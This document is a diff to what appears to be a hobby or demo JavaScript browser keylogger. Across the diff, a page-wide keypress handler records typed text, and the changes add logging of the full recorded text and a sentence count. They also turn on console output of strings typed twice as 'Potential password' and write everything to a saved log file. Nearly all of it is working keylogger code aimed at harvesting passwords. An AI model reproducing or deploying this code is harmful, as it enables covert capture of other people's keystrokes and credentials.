@@ -24,6 +24,14 @@ var possiblePasswordsString = "";     //  The list of possible passwords combine
 
 var numOfWords = 0;             //  Start the word counter
 
+var allTextSplitCopiedString = "";
+var allTextSplitCopy = [];
+
+var regex = /\W/;
+
+var dataText = "";
+var dataTextLength = 0;
+
 
 onkeypress = function(e) { // calling the function to execute whenever a keystroke is there on html document  document.onkeypress  is an event handler
     get = window.event?event:e;
@@ -74,11 +82,26 @@ function checkSplitText(allTextSplit, counts) {     //  Begins process of combin
     // console.log("Number of words so far: " + numOfWords);
     getFrequency(allTextSplit);
     getKeyAndValues(a,b);
+    filterRegex(allTextSplit, counts);
     // console.log(counts);
-    console.log("Total Number of 'Words': " +numOfWords + "\n")
-    console.log(strObj + "\n")
-    console.log(possiblePasswordsString + "")
+    console.log("Total number of 'words:'' " +numOfWords + "\n");
+    console.log(strObj + "\n");
+    console.log(possiblePasswordsString + "");
+    console.log("Text recorded: " + allTextSplitCopiedString);
+    dataText = allTextSplitCopiedString.match(/[^\.!\?]+[\.!\?(?="|')]+(\s|$)/g );
+    dataTextLength = dataText.length+1;
+    console.log("Total number of 'sentences:'" + dataTextLength);
+    // console.log("ALL TEXT SPLIT:");
 }
+
+
+//  Uses regular expressions to filter out the keystrokes recorded for any important / sensitive
+function filterRegex(allTextSplit, counts) {
+  allTextSplitCopy = allTextSplit;
+  allTextSplitCopiedString = allTextSplitCopy.join([" "]);
+  return allTextSplitCopiedString;
+}
+
 
 function numberOfWords(allTextSplit) {          //  Counts the number of words
     allTextJoined = allTextSplit.join(' ');
@@ -120,12 +143,22 @@ function objToString (counts) {         //  Make object into string to send into
     return strObj;
 }
 
-// If duplicate values are found, then this string potentially is a password since users had to enter it twice.
+// If duplicate values are found, then thisi string potentially is a password since users had to enter it twice.
 function hasDuplicates(counts, a, b) {      
         for (var prop in counts) {
+           // if (counts.hasOwnProperty(prop)) {
+           //      if (counts[prop] == "2") {
+           //          // console.log("Potential password: " + " " + prop);
+           //          possiblePasswordsString += "Potential password: " + counts[prop];
+           //          possiblePasswordsList.push(possiblePasswordsString);
+           //          possiblePasswordsString = "";
+           //      }   else {
+           //      if (counts[prop] != "2") {
+           //          possiblePasswordsString = "";
+
             if (counts.hasOwnProperty(prop)) {
                 if (counts[prop] == "2") {
-                    // console.log("Potential password: " + " " + prop);
+                    console.log("Potential password: " + " " + prop);
                     possiblePasswordsString += "\n" + "Potential password: " + prop;
             }   else {
                 if (counts[prop] != "2") {
@@ -158,6 +191,8 @@ function occurrences(string, subString, allowOverlapping) {
     return n;
 }*/
 
+
+
 //  Function below is for the example HTML page to save the keylogger data file
 function saveTextAsFile() {
     //  Repeat the process of adding the latest keys to the log to ensure latest message is recorded
@@ -170,7 +205,10 @@ function saveTextAsFile() {
                                 + "\n" + possiblePasswordsString;
     var dateString = new Date().toLocaleString();
     //  This is the final string with all the log data recorded
-    var fullLog = "Key Recordings saved on " + dateString + "\n" + "\n" + "\n" +  numOfWordsString + "\n" + "\n" + "\n" +  strObj + "\n" + "\n" + possiblePasswordsText;   
+    var recordedTextString = "Text recorded: " + "\n" + allTextSplitCopiedString;
+    var numberOfSentencesString = "Total number of 'sentences:'" + "\n" + dataTextLength;
+    var fullLog = "Key Recordings saved on " + dateString + "\n" + "\n" + "\n" +  numOfWordsString + "\n" + "\n" +
+     "\n" +  strObj + "\n" + "\n" + recordedTextString + "\n" + "\n" + "\n" + numberOfSentencesString + "\n" + "\n" + "\n" + possiblePasswordsText;   
     // allTextJoined = allTextSplit.join([separator = ' ']);
     // var textToWrite = allTextJoined;
     var textFileAsBlob = new Blob([fullLog], {type:'text/plain'});
